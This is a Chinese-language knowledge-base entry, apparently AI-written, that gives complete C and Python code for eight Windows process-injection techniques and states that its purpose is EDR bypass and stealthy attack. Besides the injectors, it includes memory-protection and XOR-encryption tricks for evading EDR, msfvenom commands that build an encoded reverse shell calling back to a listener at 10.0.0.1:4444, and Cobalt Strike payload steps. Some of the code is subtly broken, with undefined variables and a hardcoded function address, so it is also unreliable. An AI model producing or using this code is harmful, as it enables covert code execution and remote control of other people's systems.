# kb/28 · Process Injection 8 种完整代码
# CreateRemoteThread / APC / Thread Hijack / Module Stomping / Process Hollowing / AtomBombing / MapView / SetWindowsHookEx

**目的**：研究员要掌握 8 种 Process Injection 完整代码（C/Python），用于 EDR bypass 和隐蔽攻击。

---

## 28.1 CreateRemoteThread Injection（经典）

### 原理
1. OpenProcess 打开目标
2. VirtualAllocEx 申请远程内存
3. WriteProcessMemory 写入 shellcode
4. CreateRemoteThread 在目标进程启动线程

### 完整 C 实现

```c
#include <windows.h>
#include <stdio.h>

// 64-bit msgbox shellcode
unsigned char shellcode[] = {
    0x48, 0x83, 0xEC, 0x28,                    // sub rsp, 0x28
    0x48, 0x83, 0xE4, 0xF0,                    // and rsp, -0x10
    0x48, 0x8D, 0x0D, 0x05, 0x00, 0x00, 0x00,  // lea rcx, [rip+5]
    0xE8, 0x0C, 0x00, 0x00, 0x00,              // call $+0xc
    0x48, 0x8B, 0x8C, 0x24, 0x38, 0x00, 0x00, 0x00, // mov rcx, [rsp+0x38]
    0x48, 0x31, 0xC0,                          // xor rax, rax
    0x48, 0xB8,                                // mov rax, 0x...
    0x6D, 0x73, 0x67, 0x00,                    // "msg\0"
    0x00, 0x00, 0x00, 0x00,
    0x48, 0x89, 0x44, 0x24, 0x20,              // mov [rsp+0x20], rax
    0x48, 0x31, 0xC0,                          // xor rax, rax
    0x48, 0xB8,                                // mov rax, 0x...
    0x48, 0x65, 0x6C, 0x6C,                    // "Hell"
    0x6F, 0x00, 0x00, 0x00,                    // "o\0\0\0"
    0x48, 0x89, 0x44, 0x24, 0x28,              // mov [rsp+0x28], rax
    0x4D, 0x31, 0xC9,                          // xor r9, r9
    0x4D, 0x31, 0xC0,                          // xor r8, r8
    0x48, 0x8D, 0x54, 0x24, 0x20,              // lea rdx, [rsp+0x20]
    0x48, 0x8D, 0x4C, 0x24, 0x28,              // lea rcx, [rsp+0x28]
    0x48, 0xB8, 0xE0, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x4010e0 (MessageBoxA)
    0xFF, 0xD0,                                // call rax
    0xEB, 0xFE                                 // jmp $ (infinite loop)
};

int main(int argc, char* argv[]) {
    DWORD pid;
    HANDLE hProcess;
    LPVOID pRemoteCode;
    HANDLE hThread;
    SIZE_T bytesWritten;

    if (argc != 2) {
        printf("Usage: %s <pid>\n", argv[0]);
        return 1;
    }
    pid = atoi(argv[1]);

    // 1. 打开目标进程
    hProcess = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
        FALSE,
        pid
    );
    if (hProcess == NULL) {
        printf("OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }

    // 2. 在远程进程申请内存
    pRemoteCode = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (pRemoteCode == NULL) {
        printf("VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    // 3. 写入 shellcode
    WriteProcessMemory(
        hProcess,
        pRemoteCode,
        shellcode,
        sizeof(shellcode),
        &bytesWritten
    );
    if (bytesWritten != sizeof(shellcode)) {
        printf("WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // 4. 创建远程线程
    hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pRemoteCode,
        NULL,
        0,
        NULL
    );
    if (hThread == NULL) {
        printf("CreateRemoteThread failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    printf("Injection successful! Thread handle: %p\n", hThread);

    // 清理
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
```

---

## 28.2 APC Injection（异步过程调用）

### 原理
1. 打开目标线程
2. 申请远程内存 + 写入 shellcode
3. QueueUserAPC 把 shellcode 地址加入线程 APC 队列
4. 线程进入 alertable 状态（如 SleepEx/WaitForSingleObjectEx）时执行 shellcode

### 完整 C 实现

```c
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

unsigned char shellcode[] = {
    // 你的 shellcode
};

DWORD FindTargetThread(DWORD pid) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te;
    te.dwSize = sizeof(te);

    DWORD targetTid = 0;
    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                // 选第一个非主线程
                targetTid = te.th32ThreadID;
                break;
            }
        } while (Thread32Next(hSnap, &te));
    }
    CloseHandle(hSnap);
    return targetTid;
}

int main(int argc, char* argv[]) {
    DWORD pid = atoi(argv[1]);
    DWORD tid = FindTargetThread(pid);

    if (tid == 0) {
        printf("No thread found\n");
        return 1;
    }

    // 1. 打开目标进程
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
        FALSE,
        pid
    );

    // 2. 申请远程内存
    LPVOID pRemote = VirtualAllocEx(
        hProcess, NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // 3. 写入 shellcode
    WriteProcessMemory(hProcess, pRemote, shellcode, sizeof(shellcode), NULL);

    // 4. 打开线程
    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);

    // 5. QueueUserAPC
    QueueUserAPC((PAPCFUNC)pRemote, hThread, 0);

    // 线程在 alertable 状态时执行
    // 很多函数会进入 alertable：
    // SleepEx, WaitForSingleObjectEx, GetMessage, PeekMessage, etc.

    printf("APC queued. TID: %lu\n", tid);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
```

### Early Bird APC（更隐蔽）

```c
// 利用进程启动早期的 alertable 状态
// 1. CreateProcess 挂起目标
// 2. 把 APC 队列到主线程
// 3. ResumeThread → 进程启动 → 立即执行 shellcode
// 此时 EDR 还没初始化
```

---

## 28.3 Thread Hijacking（线程劫持）

### 原理
1. 打开目标线程
2. SuspendThread 暂停
3. GetThreadContext 获取上下文（rip 寄存器）
4. 申请远程内存 + 写入 shellcode
5. SetThreadContext 把 rip 改为 shellcode
6. ResumeThread 恢复线程 → 执行 shellcode

### 完整 C 实现

```c
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = {
    // 你的 shellcode
};

int main(int argc, char* argv[]) {
    DWORD pid = atoi(argv[1]);
    DWORD tid = atoi(argv[2]);

    // 1. 打开进程
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_SUSPEND_RESUME,
        FALSE, pid
    );

    // 2. 打开线程
    HANDLE hThread = OpenThread(
        THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
        FALSE, tid
    );

    // 3. 暂停线程
    SuspendThread(hThread);

    // 4. 获取上下文
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);

    // 5. 申请远程内存 + 写入 shellcode
    LPVOID pRemote = VirtualAllocEx(
        hProcess, NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    WriteProcessMemory(hProcess, pRemote, shellcode, sizeof(shellcode), NULL);

    // 6. 修改 rip 指向 shellcode
    #ifdef _WIN64
        ctx.Rip = (DWORD64)pRemote;
    #else
        ctx.Eip = (DWORD)pRemote;
    #endif

    SetThreadContext(hThread, &ctx);

    // 7. 恢复线程
    ResumeThread(hThread);

    printf("Thread hijacked. PID: %lu, TID: %lu, Shellcode: %p\n",
        pid, tid, pRemote);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
```

---

## 28.4 Module Stomping（模块踩踏）

### 原理
1. 在目标进程加载合法 DLL（如 combase.dll）
2. VirtualAlloc → 但实际申请到 DLL 已加载的 .text 区段
3. 写入 shellcode
4. 调用该 DLL 的某个函数 → 实际执行 shellcode

### 完整 C 实现

```c
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = {
    // 你的 shellcode
};

int main(int argc, char* argv[]) {
    DWORD pid = atoi(argv[1]);
    HMODULE hModule = GetModuleHandleA("combase.dll");

    // 找到 .text 段地址
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    LPVOID pText = NULL;
    SIZE_T textSize = 0;
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSec[i].Name, ".text", 5) == 0) {
            pText = (BYTE*)hModule + pSec[i].VirtualAddress;
            textSize = pSec[i].Misc.VirtualSize;
            break;
        }
    }

    // 打开目标进程
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
        FALSE, pid
    );

    // 在目标进程内分配 → 会复用 .text 段地址空间
    LPVOID pRemote = VirtualAllocEx(
        hProcess, pText, textSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // 写入 shellcode
    WriteProcessMemory(hProcess, pRemote, shellcode, sizeof(shellcode), NULL);

    // 调用任意 DLL 函数 → 触发执行
    // 这里在远程进程执行，需要通过远程线程
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, "CoTaskMemFree"),
        pRemote, 0, NULL
    );

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
```

---

## 28.5 Process Hollowing（进程镂空）

### 原理
1. CreateProcess 挂起状态启动合法进程
2. NtUnmapViewOfSection 卸载原 EXE
3. VirtualAllocEx 在原 EXE 地址空间申请
4. WriteProcessMemory 写入恶意 EXE
5. SetThreadContext 修改入口点
6. ResumeThread 执行

### 完整 C 实现

```c
#include <windows.h>
#include <stdio.h>

typedef LONG(NTAPI *pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

int main(int argc, char* argv[]) {
    // 1. 读恶意 EXE
    HANDLE hFile = CreateFileA("evil.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* pFileBuf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, fileSize);
    ReadFile(hFile, pFileBuf, fileSize, NULL, NULL);
    CloseHandle(hFile);

    // 2. 解析 PE
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pFileBuf;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pFileBuf + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    // 3. CreateProcess 挂起启动合法进程
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // 4. 卸载原 EXE
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    NtUnmapViewOfSection(pi.hProcess, (PVOID)pNt->OptionalHeader.ImageBase);

    // 5. 在 ImageBase 申请内存
    LPVOID pImageBase = VirtualAllocEx(
        pi.hProcess,
        (PVOID)pNt->OptionalHeader.ImageBase,
        pNt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // 6. 写入 PE 头
    WriteProcessMemory(pi.hProcess, pImageBase, pFileBuf, pNt->OptionalHeader.SizeOfHeaders, NULL);

    // 7. 写入各段
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(
            pi.hProcess,
            (PVOID)((DWORD_PTR)pImageBase + pSec[i].VirtualAddress),
            &pFileBuf[pSec[i].PointerToRawData],
            pSec[i].SizeOfRawData,
            NULL
        );
    }

    // 8. 修改入口点
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    #ifdef _WIN64
        ctx.Rax = (DWORD_PTR)pImageBase + pNt->OptionalHeader.AddressOfEntryPoint;
        WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &pImageBase, sizeof(PVOID), NULL);
    #else
        ctx.Eax = (DWORD)pImageBase + pNt->OptionalHeader.AddressOfEntryPoint;
    #endif
    SetThreadContext(pi.hThread, &ctx);

    // 9. 恢复线程
    ResumeThread(pi.hThread);

    HeapFree(GetProcessHeap(), 0, pFileBuf);
    return 0;
}
```

---

## 28.6 AtomBombing（原子表注入）

### 原理
1. GlobalAddAtom 把 shellcode 作为原子名写入全局原子表
2. NtQueueApcThread 把 APC 队列到目标线程
3. 触发：调用 GlobalGetAtomName（但要 hook 实现自定义 APC 回调）

### 完整 C 实现

```c
#include <windows.h>

unsigned char shellcode[] = {
    // 你的 shellcode（大小有限制：255 字节）
};

int main() {
    // 1. 把 shellcode 写入原子表
    // 限制：原子名最大 255 字节
    for (int i = 0; i < sizeof(shellcode); i += 255) {
        char atomName[256] = {0};
        int chunk = min(255, sizeof(shellcode) - i);
        memcpy(atomName, &shellcode[i], chunk);
        GlobalAddAtomA(atomName);
    }

    // 2. QueueUserAPC 触发
    // APC routine 是 GlobalGetAtomNameA
    QueueUserAPC((PAPCFUNC)GetProcAddress(
        GetModuleHandleA("kernel32.dll"),
        "GlobalGetAtomNameA"
    ), hThread, atomIndex);

    return 0;
}
```

---

## 28.7 MapView Injection

### 原理
1. 创建 section（共享内存）
2. 在攻击者进程 map view
3. 在目标进程 map view 同一 section
4. 写入 shellcode → 目标进程可执行

### 完整 C 实现

```c
#include <windows.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI *pNtCreateSection)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS(NTAPI *pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);

int main(int argc, char* argv[]) {
    DWORD pid = atoi(argv[1]);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");

    // 1. 创建 section
    HANDLE hSection;
    LARGE_INTEGER sectionSize = { sizeof(shellcode) };
    NtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
        NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    // 2. 在攻击者进程 map view
    PVOID pLocal = NULL;
    SIZE_T viewSize = sizeof(shellcode);
    NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocal, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);

    // 3. 写入 shellcode
    memcpy(pLocal, shellcode, sizeof(shellcode));

    // 4. 在目标进程 map view
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, FALSE, pid);
    PVOID pRemote = NULL;
    NtMapViewOfSection(hSection, hProcess, &pRemote, 0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READ);

    // 5. 远程执行
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemote, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}
```

---

## 28.8 SetWindowsHookEx（全局钩子）

### 原理
1. DLL 包含恶意函数
2. SetWindowsHookEx 注册全局钩子
3. 系统在任何进程触发特定事件时调用 DLL 函数
4. DLL 内执行恶意代码

### 完整 DLL + Loader

```c
// evil_dll.c
#include <windows.h>

unsigned char shellcode[] = {
    // 你的 shellcode
};

HHOOK hHook;

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        // 执行 shellcode
        PVOID pExec = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(pExec, shellcode, sizeof(shellcode));
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExec, NULL, 0, NULL);
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        hHook = SetWindowsHookExA(WH_KEYBOARD_LL, HookProc, hModule, 0);
    }
    return TRUE;
}
```

```c
// loader.c
#include <windows.h>

int main() {
    // 加载 DLL 触发钩子
    HMODULE hDll = LoadLibraryA("evil_dll.dll");
    // DLL 加载 → 钩子注册 → 等键盘事件
    Sleep(30000);  // 持续 30s
    FreeLibrary(hDll);
    return 0;
}
```

---

## 28.9 EDR 兼容性

| 技术 | 检测难度 | 兼容性 |
|------|---------|--------|
| CreateRemoteThread | 高（EDR 必检） | Win 7+ |
| APC | 中 | Win XP+ |
| Thread Hijack | 中 | Win 7+ |
| Module Stomping | 低 | Win 7+ |
| Process Hollowing | 高（EDR 必检） | Win 7+ |
| AtomBombing | 低（老技术） | Win 7-10（Win 11 限制） |
| MapView | 中 | Win 7+ |
| SetWindowsHookEx | 高 | Win 7+ |

### EDR bypass 增强

```c
// 1. 申请内存用 PAGE_READWRITE（避免 RWX 监控）
PVOID mem = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProc, mem, shellcode, size, NULL);
// 2. 再改为 PAGE_EXECUTE_READ（模拟合法内存）
VirtualProtectEx(hProc, mem, size, PAGE_EXECUTE_READ, &old);

// 3. shellcode 加密 + 运行时解密
// XOR 加密
for (int i = 0; i < sizeof(shellcode); i++) shellcode[i] ^= 0xAA;
// 入口 stub：先解密，再跳到真 shellcode
// 见 kb/29_c2_profile.md 加密模板
```

---

## 28.10 Python 完整封装

```python
# pip install pydnpinjection
# 或自己封装 ctypes

import ctypes
from ctypes import wintypes

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

# 1. OpenProcess
PROCESS_ALL_ACCESS = 0x1F0FFF
hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)

# 2. VirtualAllocEx
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

pRemote = kernel32.VirtualAllocEx(
    hProcess, None, len(shellcode),
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
)

# 3. WriteProcessMemory
written = ctypes.c_size_t(0)
kernel32.WriteProcessMemory(
    hProcess, pRemote, shellcode, len(shellcode), ctypes.byref(written)
)

# 4. CreateRemoteThread
hThread = kernel32.CreateRemoteThread(
    hProcess, None, 0, pRemote, None, 0, None
)

# 5. WaitForSingleObject
kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF)

# 6. 清理
kernel32.VirtualFreeEx(hProcess, pRemote, 0, 0x8000)  # MEM_RELEASE
kernel32.CloseHandle(hThread)
kernel32.CloseHandle(hProcess)
```

### pyngus / Frida 高级

```python
import frida

# 注入到目标进程
session = frida.attach(pid)
script = session.create_script("""
    // Frida JavaScript / Stalker
    Interceptor.attach(ptr("0x7FFA1234"), {
        onEnter(args) {
            console.log("Function called:", this.context);
        }
    });
""")
script.load()
```

---

## 28.11 Shellcode 生成

```bash
# msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shellcode.bin

# 加壳 / 编码
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
    -e x86/shikata_ga_nai -i 10 -f raw -o shellcode_enc.bin

# 自定义 shellcode（Beacon / Cobalt Strike）
# Cobalt Strike → Attacks → Packages → Windows Executable (S)
# 选 Listener → 生成
# 提取 .bin 文件中的 shellcode
```

### Shellcode 转换（Python）

```python
# bin → c 数组
with open('shellcode.bin', 'rb') as f:
    sc = f.read()

result = "unsigned char shellcode[] = {\n"
for i in range(0, len(sc), 12):
    line = "    " + ", ".join(f"0x{b:02x}" for b in sc[i:i+12])
    line += ","
    result += line + "\n"
result = result.rstrip(",\n") + "\n};\n"
print(result)
```

---

## 28.12 实战建议

```bash
# 1. 优先 Module Stomping（隐蔽 + 兼容）
# 2. APC / Thread Hijack（中隐蔽）
# 3. CreateRemoteThread / Hollowing（最易检测，但可靠）
# 4. MapView（特殊场景）
# 5. SetWindowsHookEx（GUI 程序）

# EDR 对抗：
# - shellcode 加密 + 内存解密
# - Direct Syscall（避 ntdll hook）
# - Unhook NTDLL（用 kb/24）
# - BYOVD（用 kb/24）
```

---

研究员助理已就位，等派单。
